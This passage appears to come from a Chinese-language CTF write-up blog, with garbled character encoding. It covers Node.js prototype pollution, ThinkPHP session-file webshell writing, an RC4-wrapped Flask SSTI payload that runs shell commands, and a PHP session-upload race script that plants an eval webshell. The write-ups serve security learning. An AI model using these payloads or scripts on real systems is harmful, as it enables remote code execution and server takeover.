router;</span><br></pre></td></tr></table></figure><p>å…¶å®è¿™é“é¢˜ç›®å°±æ¶‰åŠäº†ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„çŸ¥è¯†ç‚¹</p><p><img src="1.PNG"></p><p>è¿™æ˜¯åœ¨phpä¸­ä¸¤ä¸ªæ•°ç»„è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœè¾“å…¥a[]=1&amp;b[]=1é‚£ä¹ˆåˆ™ä¼šè¿”å›a!==bå°±ä¼šè¿”å›false</p><p>ä½†æ˜¯åœ¨jsä¸­ä¸æ˜¯è¿™æ ·çš„ï¼Œåœ¨jsä¸­æ•°ç»„æ˜¯å¯¹è±¡ï¼Œ==æˆ–===æ“ä½œç¬¦åªèƒ½æ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡æ˜¯å¦æ˜¯åŒä¸€ä¸ªå®ä¾‹ï¼Œä¹Ÿå°±æ˜¯æ˜¯å¦æ˜¯åŒä¸€ä¸ªå¯¹è±¡å¼•ç”¨ã€‚ç›®å‰JavaScriptæ²¡æœ‰å†…ç½®çš„æ“ä½œç¬¦åˆ¤æ–­å¯¹è±¡çš„å†…å®¹æ˜¯å¦ç›¸åŒã€‚</p><p>æ‰€ä»¥å¦‚æœæˆ‘ä»¬è¾“å…¥çš„æ˜¯?a[]=1&amp;b[]=1é‚£ä¹ˆå°±å¯ä»¥è¿›è¡Œç»•è¿‡</p><h1 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h1><p>è¿™é“é¢˜ç›®æ˜¯nodejsçš„åŸå‹é“¾æ±¡æŸ“</p><p>ä½†æ˜¯å‘ç°usernameçš„é•¿åº¦è¿›è¡Œäº†é™åˆ¶,å½“æˆ‘åœ¨passwordé‚£é‡Œä¼ å…¥{â€œaâ€: 1, â€œ__proto__â€œ: {â€œctfshowâ€: â€œ36dboyâ€}}å‘ç°å¾—åˆ°çš„ç»“æœæ˜¯è¿™æ ·çš„</p><p><img src="2.PNG"></p><p>å¾ˆæ˜¾ç„¶æ²¡æœ‰é€ æˆæ±¡æŸ“</p><p>å¥½å§ï¼Œæˆ‘åº”è¯¥ä¸€å¼€å§‹å°±æŠ“åŒ…çœ‹çœ‹</p><p><img src="3.PNG"></p><p>åŸå‹é“¾æ±¡æŸ“çš„åŸç†å¤§æ¦‚è®°å½•ä¸€ä¸‹</p><p><img src="4.PNG"></p><p>å½“æŸ¥è¯¢aä¸­ä¸å­˜åœ¨çš„å±æ€§æ—¶ï¼Œä¼šå‘ä¸ŠæŸ¥è¯¢açš„åŸå‹ï¼Œaçš„åŸå‹çš„åŸå‹â€¦..ç›´åˆ°æ‰¾åˆ°è¿™ä¸ªå±æ€§ï¼Œæˆ–è€…æ˜¯æ‰¾åˆ°objectä¹Ÿæ²¡æœ‰æ‰¾åˆ°è¿™ä¸ªå±æ€§ï¼Œobjectçš„åŸå‹æ˜¯nullï¼Œnullæ²¡æœ‰å±æ€§ï¼Œäºæ˜¯è¿”å›æœªå®šä¹‰</p><p><img src="5.png" alt="image-20211201230147106"></p><p>å¯ä»¥çœ‹åˆ°bæ˜¯æˆ‘æ–°å®šä¹‰çš„ä¸€ä¸ªå¯¹è±¡ï¼Œå› ä¸ºbè·Ÿaå…·æœ‰ç›¸åŒçš„åŸå‹ï¼Œé‚£ä¹ˆb.ckyå°±ä¸aåŒæ ·çš„æœºåˆ¶ï¼Œè¿”å›lsy</p><p>é‚£ä¹ˆå›åˆ°é¢˜ç›®ï¼Œå½“æˆ‘ä¼ å…¥çš„æ˜¯{â€œusernameâ€:â€1â€,â€passwordâ€:â€1â€,â€__proto__â€œ: {â€œctfshowâ€: â€œ36dboyâ€}},req.bodyæ¥åˆ°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy</span>(<span class="params">object1, object2</span>)</span>&#123;<span class="comment">//object1=&#123;&#125;,object2=&#123;&quot;username&quot;:&quot;1&quot;,&quot;password&quot;:&quot;1&quot;,&quot;\_\_proto\_\_&quot;: &#123;&quot;ctfshow&quot;: &quot;36dboy&quot;&#125;&#125;</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            copy(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="6.png" alt="image-20211202000622945"></p><p><img src="7.png" alt="image-20211202000755677"></p><p>object1[__proto__]={ ctfshow: â€˜36dboyâ€™ }</p><p>é‚£ä¹ˆobject1çš„åŸå‹å°±æœ‰äº†ctfshowè¿™ä¸ªå±æ€§ï¼Œ</p><p><img src="8.png" alt="image-20211202000931839"></p><p>ä»è¿™é‡Œå¯ä»¥secertä¸userå…·æœ‰ç›¸åŒçš„åŸå‹ï¼Œäºæ­¤secert.ctfshow=36dboy,å¾—åˆ°flag</p><h1 id="web339"><a href="#web339" class="headerlink" title="web339"></a>web339</h1><p>è¿™é“é¢˜ç›®ä¸ä¸Šè¿°é¢˜ç›®ä¸åŒçš„ä¸€ç‚¹æ˜¯,è¿™ä¸ªflagæ˜¯å•¥æˆ‘ä¸çŸ¥é“ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).json(),<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.session;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  utils.copy(user,req.body);</span><br><span class="line">  <span class="keyword">if</span>(secert.ctfshow===flag)&#123;</span><br><span class="line">    res.end(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.json(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;ç™»å½•å¤±è´¥&#x27;</span>+<span class="built_in">JSON</span>.stringify(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æ²¡æœ‰åŠæ³•è¿›è¡Œä¸Šä¸€æ­¥çš„æ“ä½œï¼Œæ‰€ä»¥åªèƒ½å¦æ±‚å®ƒæ³•ï¼Œæ³¨æ„åˆ°è¿™é“é¢˜ç›®çš„æºç æ¯”ä¸Šä¸€é“é¢˜ç›®å¤šç»™äº†ä¸€ä¸ªapi.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.post(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).json(),<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(query);</span><br><span class="line">  res.render(<span class="string">&#x27;api&#x27;</span>, &#123; <span class="attr">query</span>: <span class="built_in">Function</span>(query)(query)&#125;);</span><br><span class="line">   </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¢çš„Function(query)(query)ç›¸å½“äº</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">query</span>(<span class="params">query</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">eval</span>(query)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>GYCTF2020_EasyThinking</title>
      <link href="/2021/11/29/GYCTF2020-EasyThinking/"/>
      <url>/2021/11/29/GYCTF2020-EasyThinking/</url>
      
        <content type="html"><![CDATA[<p>å…ˆæ‰«ä¸€ä¸‹ç›®å½•ï¼Œä¸€èˆ¬åšè¿™ç§é¢˜ç›®çš„æ—¶å€™éƒ½ä¼šæƒ³ä¸€ä¸‹æ‰«ç›®å½•ï¼Œå‘ç°å­˜åœ¨www/zipï¼Œä¸‹è½½æºç </p><p>ç„¶åè§‚å¯Ÿç•Œé¢ï¼Œå‘ç°æœ‰æ³¨å†Œï¼Œç™»å½•ï¼Œæœç´¢ï¼Œé€€å‡ºè¿™ä¸‰ä¸ªåŠŸèƒ½</p><p>æ„Ÿè§‰æ¼æ´ç‚¹åº”è¯¥ä¼šå‡ºç°åœ¨æœç´¢è¿™é‡Œï¼Œæ‰“å¼€æºç ï¼Œå…¨å±€æœç´¢ä¸€ä¸‹search</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> public function search()</span><br><span class="line">&#123;</span><br><span class="line">    if (Request::isPost())&#123;</span><br><span class="line">        if (!session(&#39;?UID&#39;))&#x2F;&#x2F;session(&#39;?UID&#39;)åˆ¤æ–­åç§°ä¸ºnameçš„sessionå€¼æ˜¯å¦å·²ç»è®¾ç½®</span><br><span class="line">        &#123;</span><br><span class="line">            return redirect(&#39;&#x2F;home&#x2F;member&#x2F;login&#39;);         &#x2F;&#x2F;å¦‚æœæ²¡æœ‰è®¾ç½®å°±é‡å®šå‘åˆ°login   </span><br><span class="line">        &#125;</span><br><span class="line">        $data &#x3D; input(&quot;post.&quot;);</span><br><span class="line">        $record &#x3D; session(&quot;Record&quot;);&#x2F;&#x2F;å–å€¼</span><br><span class="line">        if (!session(&quot;Record&quot;))</span><br><span class="line">        &#123;</span><br><span class="line">            session(&quot;Record&quot;,$data[&quot;key&quot;]);</span><br><span class="line">        &#125;&#x2F;&#x2F;ç»™sessionè¿›è¡Œèµ‹å€¼</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            $recordArr &#x3D; explode(&quot;,&quot;,$record);&#x2F;&#x2F;å°†å­—ç¬¦ä¸²æ‰“æ•£æˆæ•°ç»„</span><br><span class="line">            $recordLen &#x3D; sizeof($recordArr);&#x2F;&#x2F;è¿”å›æ•°ç»„ä¸­å…ƒç´ çš„ä¸ªæ•°</span><br><span class="line">            if ($recordLen &gt;&#x3D; 3)&#123;</span><br><span class="line">                array_shift($recordArr);&#x2F;&#x2F;åˆ é™¤ç¬¬ä¸€ä¸ªå…ƒç´ </span><br><span class="line">                session(&quot;Record&quot;,implode(&quot;,&quot;,$recordArr) . &quot;,&quot; . $data[&quot;key&quot;]);&#x2F;&#x2F;è¿™é‡ŒæŠŠæˆ‘ä»¬ä¼ å…¥çš„æ•°æ®æ·»åŠ åˆ°äº†sessionä¸­</span><br><span class="line">                return View::fetch(&quot;result&quot;,[&quot;res&quot; &#x3D;&gt; &quot;There&#39;s nothing here&quot;]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        session(&quot;Record&quot;,$record . &quot;,&quot; . $data[&quot;key&quot;]);</span><br><span class="line">        return View::fetch(&quot;result&quot;,[&quot;res&quot; &#x3D;&gt; &quot;There&#39;s nothing here&quot;]);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return View(&quot;search&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://www.php.cn/phpkj/thinkphp/441728.html">ThinkPhpä»»æ„æ–‡ä»¶è¯»å–æˆå› </a></p><p>ä»ä¸Šè¿°èµ„æ–™ä¸­å¯çŸ¥ï¼Œæˆ‘ä»¬æ§åˆ¶å†™å…¥çš„æ–‡ä»¶åï¼Œå‰ææ˜¯æ–‡ä»¶åçš„é•¿åº¦æ˜¯32ä½ï¼Œç„¶åå†åˆ©ç”¨keyä¼ å…¥æˆ‘ä»¬æˆ‘ä»¬çš„æ¶æ„ä»£ç </p><p>æ‰€ä»¥åœ¨æ³¨å†Œçš„æ—¶å€™</p><p><img src="1.png"></p><p>ç„¶ååœ¨æœç´¢çš„æ—¶å€™è¾“å…¥<?php @eval($_POST[a]);?></p><p><img src="2.png"></p><p><img src="3.png"></p><p>æˆ‘ä»¬çŸ¥é“sessionæ–‡ä»¶å­˜åœ¨çš„è·¯å¾„æ˜¯sess_XXX</p><p><img src="4.png"></p><p>å‘ç°éœ€è¦ç»•è¿‡disable_function</p><p>å…ˆè¿ä¸Šèšå‰‘</p><p><img src="5.png"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ï¼Œæ˜¯ç»è¿‡åºåˆ—åŒ–æ“ä½œï¼Œåªè¦å°†sessionå†…å®¹ååºåˆ—åŒ–å³å¯getshell</p><blockquote><p>å¦‚æœè¦ getshell çš„è¯ï¼Œåç«¯éœ€è¦æœ‰ç±»ä¼¼çš„ Session::Set(â€˜nameâ€™,$_POST[â€˜iâ€™]) ä»£ç æ‰å¯ä»¥åˆ©ç”¨</p></blockquote><p>ç„¶ååˆ©ç”¨ä¸Šä¼ phpçªç ´disable_functionçš„expæ‰å¯ä»¥ï¼Œæˆ‘ä»¬é€‰æ‹©ä¸Šä¼ åˆ°</p><p><img src="6.png"></p><p>æ ¹æ®phpç‰ˆæœ¬ï¼Œé€‰æ‹©çš„æ˜¯</p><blockquote><p>C:\Users\12230\Desktop\WEB\ç»•è¿‡disable_function\exploits-master\php-filter-bypass</p></blockquote><p>ä¿®æ”¹æ–‡ä»¶ä¸­pwn,</p><p><img src="7.png"></p><p>å¾—åˆ°flag</p><h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2019_åä¸œå—èµ›åŒº_Double_Secret</title>
      <link href="/2021/11/29/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/"/>
      <url>/2021/11/29/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/</url>
      
        <content type="html"><![CDATA[<p>æ‰«æç›®å½•ï¼Œå‘ç°å­˜åœ¨secretç›®å½•ï¼Œç„¶åä¼ å…¥å‚æ•°?secret=asd sadasq(éšä¾¿ä¼ )ä½¿å…¶æŠ¥é”™</p><p><img src="1.PNG"></p><p>å…¶å®åœ¨æ¯”èµ›çš„æ—¶å€™ï¼Œæˆ‘ä¸€æ—¦çœ‹åˆ°æœ‰æ²¡æœ‰è§è¿‡çš„çŸ¥è¯†å°±ä¼šå¤±å»æ€è€ƒçš„èƒ½åŠ›ï¼Œè€Œè¿™ä¸ªèƒ½åŠ›æ˜¯åœ¨æ—¥å¸¸è®­ç»ƒä¸­å¾—åˆ°äº†</p><p>webåº”ç”¨çš„æœ¬è´¨ï¼š</p><li> æµè§ˆå™¨å‘é€ä¸€ä¸ªhttpè¯·æ±‚<li> æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚ä¹‹åï¼Œç”Ÿæˆä¸€ä¸ªhtmlæ–‡æ¡£<li> æœåŠ¡å™¨æŠŠhtmlæ–‡æ¡£ä½œä¸ºhttpå“åº”çš„bodyå‘é€ç»™æµè§ˆå™¨<li> æµè§ˆå™¨æ”¶åˆ°httpå“åº”ï¼Œä»http bodyå–å‡ºhtmlæ–‡æ¡£å¹¶æ˜¾ç¤º<blockquote><p>wsgi:wsgiå¯ä»¥èµ·åˆ°æ¥å£ä½œç”¨, å‰é¢å¯¹æ¥æœåŠ¡å™¨,åé¢å¯¹æ¥appå…·ä½“åŠŸèƒ½</p></blockquote><p><img src="2.png"></p><li> environ:ä¸€ä¸ªåŒ…å«æ‰€æœ‰httpè¯·æ±‚ä¿¡æ¯çš„dictå¯¹è±¡<li> start_response:ä¸€ä¸ªå‘é€httpå“åº”çš„å‡½æ•°<p>å½“è¯·æ±‚å‘è¿‡æ¥çš„æ—¶å€™ï¼Œè°ƒç”¨äº†__call__æ–¹æ³•ï¼Œå®é™…ä¸Šè°ƒç”¨çš„æ˜¯wsgi_appçš„æ–¹æ³•ï¼ŒåŒæ—¶ä¼ å…¥äº†environä¸start_response</p><p><img src="3.png"></p><p>å¯ä»¥çœ‹åˆ°è®¾ç½®äº†é¢„å¤„ç†,é”™è¯¯å¤„ç†<br>sys.exc_info()è·å–å¼‚å¸¸å¤„ç†</p><p><img src="5.png"></p><p>è¿™é‡Œåº”è¯¥å°±æ˜¯æ¼æ´ç‚¹äº†ï¼Œé‡‡ç”¨çš„åŠ å¯†æ–¹æ³•æ˜¯rc4ï¼Œç§˜é’¥æ˜¯HereIsTreasureï¼Œç„¶åå­˜åœ¨sstiæ¼æ´</p><p>åœ¨ç½‘ä¸Šæ‰¾çš„rceè§£å¯†è„šæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import base64</span><br><span class="line">from urllib.parse import quote</span><br><span class="line">def rc4_main(key &#x3D; &quot;init_key&quot;, message &#x3D; &quot;init_message&quot;):</span><br><span class="line">    # print(&quot;RC4åŠ å¯†ä¸»å‡½æ•°&quot;)</span><br><span class="line">    s_box &#x3D; rc4_init_sbox(key)</span><br><span class="line">    crypt &#x3D; str(rc4_excrypt(message, s_box))</span><br><span class="line">    return  crypt</span><br><span class="line">def rc4_init_sbox(key):</span><br><span class="line">    s_box &#x3D; list(range(256))  # æˆ‘è¿™é‡Œæ²¡ç®¡ç§˜é’¥å°äº256çš„æƒ…å†µï¼Œå°äº256ä¸æ–­é‡å¤å¡«å……å³å¯</span><br><span class="line">    # print(&quot;åŸæ¥çš„ s ç›’ï¼š%s&quot; % s_box)</span><br><span class="line">    j &#x3D; 0</span><br><span class="line">    for i in range(256):</span><br><span class="line">        j &#x3D; (j + s_box[i] + ord(key[i % len(key)])) % 256</span><br><span class="line">        s_box[i], s_box[j] &#x3D; s_box[j], s_box[i]</span><br><span class="line">    # print(&quot;æ··ä¹±åçš„ s ç›’ï¼š%s&quot;% s_box)</span><br><span class="line">    return s_box</span><br><span class="line">def rc4_excrypt(plain, box):</span><br><span class="line">    # print(&quot;è°ƒç”¨åŠ å¯†ç¨‹åºæˆåŠŸã€‚&quot;)</span><br><span class="line">    res &#x3D; []</span><br><span class="line">    i &#x3D; j &#x3D; 0</span><br><span class="line">    for s in plain:</span><br><span class="line">        i &#x3D; (i + 1) % 256</span><br><span class="line">        j &#x3D; (j + box[i]) % 256</span><br><span class="line">        box[i], box[j] &#x3D; box[j], box[i]</span><br><span class="line">        t &#x3D; (box[i] + box[j]) % 256</span><br><span class="line">        k &#x3D; box[t]</span><br><span class="line">        res.append(chr(ord(s) ^ k))</span><br><span class="line">    # print(&quot;resç”¨äºåŠ å¯†å­—ç¬¦ä¸²ï¼ŒåŠ å¯†åæ˜¯ï¼š%res&quot; %res)</span><br><span class="line">    cipher &#x3D; &quot;&quot;.join(res)</span><br><span class="line">    print(&quot;åŠ å¯†åçš„å­—ç¬¦ä¸²æ˜¯ï¼š%s&quot; %quote(cipher))</span><br><span class="line">    #print(&quot;åŠ å¯†åçš„è¾“å‡º(ç»è¿‡ç¼–ç ):&quot;)</span><br><span class="line">    #print(str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;))</span><br><span class="line">    return (str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;))</span><br><span class="line">rc4_main(&quot;HereIsTreasure&quot;,&quot;&#123;&#123;url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](\&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flag.txt&#39;).\x72\x65\x61\x64()\&quot;)&#125;&#125;&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é…åˆsstiå¾—åˆ°flag</p><h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><p>ç¬‘æ­»æˆ‘å•¦ï¼Œæˆ‘åˆšå¼€å§‹å†™çš„æ˜¯popen(â€˜whoamiâ€™)ï¼Œç„¶åå‡ºæ¥çš„ä¸€ç›´å°±æ˜¯<br>â€˜readâ€™ is not allowed. Secret is glzjinï¼Œæˆ‘å°±åœ¨æƒ³æ€ä¹ˆç»•è¿‡ï¼Œåæ¥æ‰å‘ç°whoamiæ˜¾ç¤ºçš„å°±æ˜¯glzjin</p><p>è¿™é“é¢˜ç›®å¯¹äºæˆ‘æ¥è¯´ï¼Œä¸€å¼€å§‹çš„æ²¡æœ‰æƒ³åˆ°éšä¾¿è¾“å…¥å…¶å®äº§ç”ŸæŠ¥é”™ï¼Œå¦‚æœåœ¨æ¯”èµ›ä¸­æˆ‘çœ‹åˆ°æŠ¥é”™çš„è¯å¯èƒ½ä¼šæ”¾å¼ƒä¸ä¼šåœ¨ç»§ç»­ä¸‹å»äº†ï¼Œè¦ä¸€æ­¥ä¸€æ­¥çš„çœ‹ä»£ç ï¼Œwebæœ€é‡è¦çš„è¿˜æ˜¯å®¡è®¡</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NPUCTF2020-ezinclude</title>
      <link href="/2021/11/29/NPUCTF2020-ezinclude/"/>
      <url>/2021/11/29/NPUCTF2020-ezinclude/</url>
      
        <content type="html"><![CDATA[<p>é¢˜ç›®æ‰“å¼€åï¼Œçœ‹åˆ°æœ‰æç¤º</p><p><img src="1.png"></p><p>æŠ“åŒ…</p><p><img src="2.png"></p><p>å°è¯•åœ¨çº¿è§£å¯†ï¼Œå‘ç°æ— æ³•è§£å¯†</p><p>ç„¶åçŒœæµ‹æ˜¯ä¼ å‚?pass=fa25e54758d5d5c1927781a6ede89f8a</p><p><img src="3.png"></p><p>ç„¶åå°±å¯ä»¥çœ‹åˆ°é‡å®šå‘åˆ°äº†flflflflag.php</p><p>è®¿é—®ï¼Œå‘ç°å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´</p><p>ç„¶åè¯»å–æºç ,?file=php://filter/read=convert.base64-encode/resource=flflflflag.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">if(preg_match(&#39;&#x2F;data|input|zip&#x2F;is&#39;,$file))&#123;</span><br><span class="line">die(&#39;nonono&#39;);</span><br><span class="line">&#125;</span><br><span class="line">@include($file);</span><br><span class="line">echo &#39;include($_GET[&quot;file&quot;])&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>æŠŠdataï¼Œinputè¿‡æ»¤ä¹‹åå°±æ²¡æœ‰åŠæ³•è¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†ï¼Œæƒ³åˆ°ä½¿ç”¨ä¸‡èƒ½çš„sessioåŒ…å«</p><p>è„šæœ¬ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">host &#x3D; &#39;http:&#x2F;&#x2F;69d76cb9-b8a9-498d-95c4-4a8da2d018ca.node4.buuoj.cn:81&#x2F;flflflflag.php&#39;</span><br><span class="line">sessid &#x3D; &#39;lucky&#39;</span><br><span class="line"></span><br><span class="line">def POST(session):</span><br><span class="line">    while True:</span><br><span class="line">        f &#x3D; io.BytesIO(b&#39;a&#39; * 1024 * 50)</span><br><span class="line">        session.post(</span><br><span class="line">            host,</span><br><span class="line">            data&#x3D;&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&quot;&lt;?php system(&#39;ls &#x2F;&#39;);fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;);echo md5(&#39;1&#39;);?&gt;&quot;&#125;,</span><br><span class="line">            files&#x3D;&#123;&quot;file&quot;:(&#39;a.txt&#39;, f)&#125;,</span><br><span class="line">            cookies&#x3D;&#123;&#39;PHPSESSID&#39;:sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">def READ(session):</span><br><span class="line">    while True:</span><br><span class="line">        response &#x3D; session.get(f&#39;&#123;host&#125;?file&#x3D;&#x2F;tmp&#x2F;sess_&#123;sessid&#125;&#39;)</span><br><span class="line">        # print(response.text)</span><br><span class="line">        if &#39;c4ca4238a0b923820dcc509a6f75849b&#39; not in response.text:</span><br><span class="line">            print(&#39;[+++]retry&#39;)</span><br><span class="line">        else:</span><br><span class="line">            print(response.text)</span><br><span class="line">            sys.exit(0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">with requests.session() as session:</span><br><span class="line">    t1 &#x3D; threading.Thread(target&#x3D;POST, args&#x3D;(session, ))</span><br><span class="line">    t1.daemon &#x3D; True</span><br><span class="line">    t1.start()</span><br><span class="line">    READ(session)</span><br><span class="line"></span><br><span 